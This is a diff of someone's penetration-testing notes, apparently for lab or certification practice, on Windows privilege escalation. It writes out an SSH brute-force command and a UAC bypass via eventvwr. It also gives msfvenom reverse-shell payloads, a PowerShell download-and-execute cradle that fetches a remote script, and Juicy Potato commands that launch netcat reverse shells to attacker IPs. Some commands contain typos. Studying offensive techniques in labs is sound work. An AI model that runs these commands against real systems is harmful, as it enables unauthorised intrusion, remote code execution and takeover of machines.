@@ -256,14 +256,30 @@ Pattern
                      hydra -l gibson -p zaq1xsw2cde3 10.11.1.71 ssh
         
         4.2 Windows           
-        ref  : https://samsclass.info/123/proj10/px16-hashcat-win.htm
-               https://guif.re/windowseop
-               https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
-               
+        
+           ref  : https://samsclass.info/123/proj10/px16-hashcat-win.htm
+                  https://guif.re/windowseop
+                  https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
+
+           Starts with whoami/priv
+
         
         4.2.1 UAC Bypass   ref: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
-             whoami /priv
-             Look for SeChangeNotifyPrivilege'       Bypass traverse checking             Enabled 
+             Look for following indicators
+                   SeChangeNotifyPrivilege'       Bypass traverse checking             Enabled 
+                   reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
+                    
+             EnableLUA if 0 == execute PsExec || if 1 == check for followings
+                    ConsentPromptBehaviorAdmin   either 0, 2 or 5.
+                    PromptOnSecureDesktop        either 0 or 1.
+             
+             Search for enventvwr
+                    where /r C:\windows eventvwr.exe
+             Download strings.exe 
+                    https://docs.microsoft.com/en-us/sysinternals/downloads/strings
+             Verify that AutoElevate is "True"
+                    strings64.exe -accepteula C:\Windows\System32\eventvwr.exe | findstr /i autoelevate
+      
              Download: https://github.com/turbo/zero2hero  --> main.c
              Create two reverse shells
                      msfvenom -a x86 --platform Windows -p windows/shell_everse_tcp LHOST=192.168.119.131 LPORT=3333 -f exe -o reverse_3333.exe
@@ -302,17 +318,19 @@ Pattern
                 check     SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
                 https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe
                 https://eternallybored.org/misc/netcat/
-                Create a bat file
-                  powershell "IEX(New-Object Net.Webclient).downloadString('http//192.168.119.131/rev_4444.ps1)"
-                Create a reverse shell using nisheng and name it rev_4444.ps1
-                Execute the bat file using Juicy Potato
-                  jp86.exe -t * -p C:\wamp\www\PHP\1\fileManager\collectives\DG0\hackme\see.bat -l 9001
-                  host: rlwrap -r nc -nlvp 4444
-                
-
-                Place Juicy Potato and netcat on the target computer. 
-                JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\wamp\www\PHP\1\fileManager\collectives\DG0\hackme\nc.exe -e cmd.exe 10.10.10.12 443" -t
-                Host: rlwrap -r nc -nlvp 
+                1. Send Powershell 
+                   Create a bat file
+                     powershell "IEX(New-Object Net.Webclient).downloadString('http//192.168.119.131/rev_4444.ps1)"
+                   Create a reverse shell using nisheng and name it rev_4444.ps1
+                   Execute the bat file using Juicy Potato
+                     Verify that Juicy Potato works on the computer. 
+                           jp86.exe -t t -p c:\windows\system32\cmd.exe -l 5839 -c "{A47979D2-C419-11D9-A5B4-001185AD2B89}"
+                     jp86.exe -t * -p C:\wamp\www\PHP\1\fileManager\collectives\DG0\hackme\see.bat -l 9001
+                     host: rlwrap -r nc -nlvp 4444
+                2. Netcat way
+                   Place Juicy Potato and netcat on the target computer. 
+                      JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\wamp\www\PHP\1\fileManager\collectives\DG0\hackme\nc.exe -e cmd.exe 10.10.10.12 443" -t
+                      Host: rlwrap -r nc -nlvp 
                     
                     
     4.3.Priviliege Escalation      
